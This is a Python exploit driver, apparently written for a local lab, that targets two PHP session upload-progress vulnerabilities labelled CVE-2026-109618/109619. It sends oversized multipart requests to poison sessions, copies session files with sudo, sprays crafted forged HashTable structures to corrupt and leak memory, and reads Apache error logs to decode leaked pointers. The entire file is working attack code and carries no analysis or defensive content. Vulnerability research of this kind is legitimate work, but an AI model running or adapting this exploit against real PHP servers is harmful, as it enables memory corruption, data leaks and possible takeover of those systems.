#!/usr/bin/env python3
"""CVE-2026-109618/109619 lab driver: poison, rearm, consume (tag/craft)."""
import re
import socket
import struct
import subprocess
import sys
import time

import requests

HOST = "127.0.0.1"
PORT = 8084
ERRLOG = "/var/log/apache2/error.log"   # php fprintf(stderr) lands here
BND  = "----B"


def sh(cmd, t=120):
    return subprocess.run(["sudo", "sh", "-c", cmd],
                          capture_output=True, text=True, timeout=t)


def logs(t=180, n=200000):
    r = subprocess.run(["sudo", "tail", "-n", str(n), ERRLOG],
                       capture_output=True, text=True, timeout=t)
    return r.stdout + r.stderr


def ser_events():
    return [l for l in logs().splitlines() if "[ser]" in l]


def body(fields, files):
    out = b""
    for k, v in fields:
        if isinstance(k, str): k = k.encode()
        if isinstance(v, str): v = v.encode()
        out += (b"--" + BND.encode() + b"\r\nContent-Disposition: form-data; name=\""
                + k + b"\"\r\n\r\n" + v + b"\r\n")
    for name, fn, content in files:
        if isinstance(fn, str): fn = fn.encode()
        if isinstance(content, str): content = content.encode()
        out += (b"--" + BND.encode() + b"\r\nContent-Disposition: form-data; name=\""
                + name.encode() + b"\"; filename=\"" + fn
                + b"\"\r\nContent-Type: application/octet-stream\r\n\r\n"
                + content + b"\r\n")
    out += b"--" + BND.encode() + b"--\r\n"
    return out


def post_chunked(path, b, t=600, sid=None, headers=None):
    s = socket.create_connection((HOST, PORT), timeout=t)
    hdr = (f"POST {path} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
           f"Content-Type: multipart/form-data; boundary={BND}\r\n"
           f"Content-Length: {len(b)}\r\n")
    if sid:
        hdr += f"Cookie: PHPSESSID={sid}\r\n"
    for k, v in (headers or {}).items():
        hdr += f"{k}: {v}\r\n"
    s.sendall((hdr + "\r\n").encode())
    s.sendall(b)
    resp = b""
    s.settimeout(t)
    try:
        while True:
            d = s.recv(1 << 16)
            if not d:
                break
            resp += d
    except socket.timeout:
        print("(recv timeout)")
    s.close()
    head, _, payload = resp.partition(b"\r\n\r\n")
    return head.split(b"\r\n")[0].decode(errors="replace"), payload


# ---------------------------------------------------------------- request shapes

def full_request(progress_key, sid):
    """The 1000-part ratchet/rearm request shape (content_length ~4.91MB)."""
    fields = [("PHP_SESSION_UPLOAD_PROGRESS", progress_key), ("PHPSESSID", sid)]
    files = [(f"f{j}", "A" * 4800, b"") for j in range(1000)]
    return fields, files


def cmd_plant(sid):
    r = requests.get(f"http://{HOST}:{PORT}/plant.php",
                     params={"sid": sid, "mode": "obj"}, timeout=30)
    print(r.text.strip()[:120])


def cmd_ratchet(sid, n=5):
    for i in range(n):
        ev0 = len(ser_events())
        fields, files = full_request(f"upload_progress_rk{i}", sid)
        b = body(fields, files)
        st, _ = post_chunked("/dbg.php", b, t=300, sid=sid)
        evs = ser_events()[ev0:]
        init = [l for l in evs if "INIT FRESH" in l]
        dest = [l for l in evs if "DESTROY real destroy" in l]
        print(f"ratchet {i}: {st} inits={len(init)} destroys={len(dest)}")
        if len(init) > len(dest):
            print(f">>> POISONED: {len(init)} init vs {len(dest)} destroy")
            print("   ", init[-1])
            return True
        time.sleep(0.3)
    return False


def cmd_rearm(src, dst):
    """Copy at-the-edge session to a fresh sid, fire full request -> OOM -> poison."""
    r = sh(f"cp /tmp/sess_{src} /tmp/sess_{dst} && chmod 666 /tmp/sess_{dst} && ls -la /tmp/sess_{dst}")
    print(r.stdout.strip())
    ev0 = len(ser_events())
    fields, files = full_request("rearm1", dst)
    b = body(fields, files)
    st, payload = post_chunked("/dbg.php", b, t=300, sid=dst)
    evs = ser_events()[ev0:]
    init = [l for l in evs if "INIT FRESH" in l]
    dest = [l for l in evs if "DESTROY real destroy" in l]
    print(f"rearm: status={st} body={len(b)} inits={len(init)} destroys={len(dest)}")
    for l in evs[-8:]:
        print(" ", l)
    if len(init) > len(dest):
        print(">>> POISONED:", init[-1])
        m = re.search(r"INIT FRESH d=(0x[0-9a-f]+) arData=(0x[0-9a-f]+)", init[-1])
        if m:
            print(f">>> struct d={m.group(1)} catcher_arData={m.group(2)}")
        return True
    return False


# ---------------------------------------------------------------- sprays

def spray_value(i, mode, cover_idx=None, cover_off=None, catcher=None, spray_len=616, mask=0xFFFFFFFF, used=0):
    if mode == "tag":
        v = b""
        for u in range(spray_len // 8):
            v += struct.pack("<II", i * 128 + u, 0xFFFFFFFF)
        return v
    if mode in ("craft", "hybrid"):
        v = bytearray(spray_value(i, "tag", spray_len=spray_len)) if mode == "hybrid" else bytearray(b"\xff" * spray_len)
        if (i == cover_idx and cover_off is not None and cover_off >= 0
                and cover_off + 60 <= spray_len):
            o = cover_off
            v[o:o+8]    = struct.pack("<II", 1, 7)          # gc: rc=1, IS_ARRAY
            v[o+8:o+12]  = struct.pack("<I", 0)             # flags
            v[o+12:o+16] = struct.pack("<I", mask)         # mask selects slot offset
            v[o+16:o+24] = struct.pack("<Q", catcher)        # arData -> catcher
            v[o+24:o+32] = struct.pack("<II", used, 0)       # used, num
            v[o+32:o+40] = struct.pack("<II", 0xFFFFFFFF, 0) # size, internal
            v[o+40:o+48] = struct.pack("<Q", 0)              # nextFree
            v[o+48:o+56] = struct.pack("<Q", 0)              # pDestructor
            v[o+56:o+60] = struct.pack("<I", 0)              # n
        return bytes(v)
    return b"\xff" * spray_len


def decode_tag_arm(evs):
    for l in evs:
        m = re.search(r"INIT STALE-REUSE.*arData=0x([0-9a-f]+) mask=([0-9a-f]+) "
                      r"used=(\d+) num=(\d+) size=(\d+)", l)
        if m:
            ardata = int(m.group(1), 16)
            tag16 = ardata & 0xFFFFFFFF
            used = int(m.group(3)); size = int(m.group(5))
            if tag16 == 0xFFFFFFFF:
                return None, l
            idx, unit16 = divmod(tag16, 128)
            ok = (used == tag16 + 1 and size == tag16 + 2)
            off = unit16 * 8 - 16
            print(f"decode: tag16={tag16} -> cover_idx={idx} unit16={unit16} "
                  f"off={off} consistent={ok}")
            return (idx, off), l
    return None, "(no STALE-REUSE line)"


def cmd_consume(sid, n_spray=30000, spray_len=616, mode="plain",
                cover_idx=None, cover_off=None, catcher=None, mask=0xFFFFFFFF,
                path="/leak.php", used=0, headers=None):
    fields = [("PHP_SESSION_UPLOAD_PROGRESS", "ck"), ("PHPSESSID", sid)]
    fields += [(f"spray{i:05d}", spray_value(i, mode, cover_idx, cover_off,
                                              catcher, spray_len, mask, used))
               for i in range(n_spray)]
    files = [("f0", "C" * 64, b"z")]
    b = body(fields, files)
    print(f"consume: sid={sid} mode={mode} sprays={n_spray}x{spray_len} "
          f"body={len(b)} ({len(b)/1e6:.1f} MB)")
    ev0 = len(ser_events())
    st, payload = post_chunked(path, b, t=600, sid=sid, headers=headers)
    evs = ser_events()[ev0:]
    print("status:", st)
    for l in [l for l in evs if "STALE" in l or "ADD" in l or "real destroy" in l][:12]:
        print(" ", l)
    print("--- response ---")
    sys.stdout.write(payload.decode(errors="replace")[:6000])
    if mode == "tag":
        dec, line = decode_tag_arm(evs)
        if dec:
            print(f"\n>>> cover_idx={dec[0]} cover_off={dec[1]}")


def cmd_reset():
    """Restart Apache: clears a worker hung on a leaked session flock (and any poison)."""
    r = subprocess.run(["sudo", "systemctl", "restart", "apache2"],
                       capture_output=True, text=True, timeout=60)
    print("apache reset:", "ok" if r.returncode == 0 else r.stderr.strip()[:200])


def cmd_prep(sid, mode="rc32"):
    r = requests.get(f"http://{HOST}:{PORT}/plant.php",
                     params={"sid": sid, "mode": mode}, timeout=30)
    print("prep", sid, "->", r.text.strip()[:120])


def cmd_ser(n=30):
    evs = ser_events()
    print("\n".join(evs[-n:]) if evs else "(no [ser] events)")


if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "ser"
    if cmd == "plant":
        cmd_plant(sys.argv[2])
    elif cmd == "ratchet":
        ok = cmd_ratchet(sys.argv[2], int(sys.argv[3]) if len(sys.argv) > 3 else 5)
        sys.exit(0 if ok else 1)
    elif cmd == "rearm":
        ok = cmd_rearm(sys.argv[2], sys.argv[3])
        sys.exit(0 if ok else 1)
    elif cmd == "consume":
        # consume SID [n_spray] [mode] [cover_idx] [cover_off] [catcher_hex]
        sid = sys.argv[2]
        n_spray = int(sys.argv[3]) if len(sys.argv) > 3 else 30000
        mode = sys.argv[4] if len(sys.argv) > 4 else "plain"
        kw = {"mode": mode}
        if mode == "craft":
            kw["cover_idx"] = int(sys.argv[5])
            kw["cover_off"] = int(sys.argv[6])
            kw["catcher"] = int(sys.argv[7], 16)
            if len(sys.argv) > 8:
                kw["mask"] = int(sys.argv[8], 16)
        if len(sys.argv) > 9:
            kw["path"] = sys.argv[9]
        if len(sys.argv) > 10:
            kw["used"] = int(sys.argv[10])
        cmd_consume(sid, n_spray, **kw)
    elif cmd == "reset":
        cmd_reset()
    elif cmd == "prep":
        cmd_prep(sys.argv[2], sys.argv[3] if len(sys.argv) > 3 else "rc32")
    elif cmd == "ser":
        cmd_ser(int(sys.argv[2]) if len(sys.argv) > 2 else 30)
